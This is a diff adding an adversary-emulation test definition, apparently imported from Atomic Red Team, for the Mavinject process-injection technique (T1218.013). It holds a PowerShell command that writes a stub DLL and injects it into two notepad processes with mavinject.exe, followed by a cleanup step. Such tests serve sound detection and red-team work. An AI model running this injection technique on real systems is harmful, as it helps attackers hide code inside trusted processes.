@@ -1,0 +1,35 @@
+- id: 661feb02-ac4e-4a69-9de3-90e10b61e4a2
+  name: T1218.013 - Sequential Dual-Process Mavinject Injection Trigger
+  description: Simulates an adversary executing back-to-back mavinject.exe injections
+    into two separate target processes.
+  tactic: stealth
+  technique:
+    attack_id: T1218.013
+    name: 'System Binary Proxy Execution: Mavinject'
+  platforms:
+    windows:
+      psh:
+        command: $dll = "$env:TEMP\dual_stub.dll"; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll,
+          [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; $p1 = Start-Process
+          notepad.exe -PassThru; $p2 = Start-Process notepad.exe -PassThru; mavinject.exe
+          $p1.Id /INJECTRUNNING $dll; mavinject.exe $p2.Id /INJECTRUNNING $dll; Write-Host
+          "[+] Sequential dual-process injection completed."
+        cleanup: $dll = "$env:TEMP\dual_stub.dll"; if (Test-Path $dll) { Remove-Item
+          $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad
+          -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up dual process
+          injection targets."
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1218.013
+  - stealth
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2021-09-22T17:45:10.241Z'
+    atomic_guid: 661feb02-ac4e-4a69-9de3-90e10b61e4a2
+    import_timestamp: '2026-10-28T07:56:02.603890Z'
